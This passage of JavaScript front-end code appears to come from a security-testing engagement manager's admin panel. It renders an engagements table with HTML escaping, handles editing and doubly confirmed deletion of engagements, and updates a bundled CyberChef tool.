                                    <span class="badge badge-${eng.status === 'active' ? 'success' : 'secondary'}">${escapeHtml(eng.status || 'active')}</span>
                                </td>
                                <td style="padding:10px 12px;">${escapeHtml(eng.start_date || '')}${eng.end_date ? ' – ' + escapeHtml(eng.end_date) : ''}</td>
                                <td style="padding:10px 12px;text-align:right;display:flex;gap:8px;justify-content:flex-end;">
                                    <button class="btn btn-sm btn-secondary"
                                            onclick="AdminPanel.editEngagement(${eng.id})">
                                        Edit
                                    </button>
                                    <button class="btn btn-sm btn-danger"
                                            data-action="confirm-delete-engagement" data-engagement-id="${Number(eng.id)}" data-engagement-name="${escapeHtml(eng.name)}">
                                        Delete
                                    </button>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            `;
        } catch (err) {
            container.innerHTML = `<p class="text-error">Failed to load engagements: ${escapeHtml(err.message)}</p>`;
        }
    },

    editEngagement(engagementId) {
        // Ensure the engagement is in AppState so handleEditEngagement can find it
        if (window.AppState && this._engagementsCache) {
            const cached = this._engagementsCache.find(e => e.id === engagementId);
            if (cached) {
                AppState.engagements = AppState.engagements || [];
                if (!AppState.engagements.find(e => e.id === engagementId)) {
                    AppState.engagements.push(cached);
                }
            }
        }
        if (typeof handleEditEngagement === 'function') {
            handleEditEngagement(engagementId);
        }
    },

    confirmDeleteEngagement(engagementId, engagementName) {
        const first = confirm(
            `Delete "${engagementName}"?\n\n` +
            `This will permanently remove ALL data for this engagement:\n` +
            `  • All hosts, ports, and credentials\n` +
            `  • All evidence, notes, and findings\n\n` +
            `This cannot be undone. Continue?`
        );
        if (!first) return;

        const second = confirm(
            `FINAL CONFIRMATION\n\n` +
            `You are about to permanently delete:\n"${engagementName}"\n\n` +
            `Click OK to delete, or Cancel to abort.`
        );
        if (!second) return;

        this.deleteEngagement(engagementId, engagementName);
    },

    async deleteEngagement(engagementId, engagementName) {
        try {
            await API.engagements.delete(engagementId);

            // Remove row from table
            const row = document.getElementById(`eng-row-${engagementId}`);
            if (row) row.remove();

            // If it was the active engagement, clear it
            if (window.AppState && AppState.activeEngagement?.id === engagementId) {
                AppState.activeEngagement = null;
                if (typeof updateActiveEngagementDisplay === 'function') {
                    updateActiveEngagementDisplay(null);
                }
            }

            // Keep local AppState in sync
            if (window.AppState) {
                AppState.engagements = (AppState.engagements || []).filter(e => e.id !== engagementId);
            }

            showToast(`Engagement "${engagementName}" deleted.`, 'success');
        } catch (err) {
            showToast(`Delete failed: ${err.message}`, 'error');
        }
    },

    async updateCyberChef() {
        const updateBtn = document.getElementById('updateCyberChefBtn');
        updateBtn.disabled = true;
        updateBtn.textContent = 'Updating...';

        try {
            const result = await API.admin.updateCyberChef();
            showToast(`CyberChef updated to ${result.new_version}`, 'success');

            this.cyberchefStatus.version = result.new_version;
            this.cyberchefStatus.installed = true;
            this.updateCyberChefDisplay();

            document.getElementById('cyberchefUpdateInfo').style.display = 'none';
            updateBtn.style.display = 'none';

            // Refresh iframe if Tools section is active
            if (typeof ToolsManager !== 'undefined' && ToolsManager.activeTab === 'cyberchef') {
                ToolsManager.renderToolsSection();
            }
        } catch (error) {
            console.error('Failed to update CyberChef:', error);
            showToast('Failed to update CyberChef: ' + error.message, 'error');
            updateBtn.disabled = false;
            updateBtn.textContent = 'Update';
        }
    }
};

// Make AdminPanel available globally
window.AdminPanel = AdminPanel;

// The engagement name travels in a data-* attribute, never inside handler code (H-10).
registerAction('confirm-delete-engagement', el =>
    AdminPanel.confirmDeleteEngagement(Number(el.dataset.engagementId), el.dataset.engagementName));
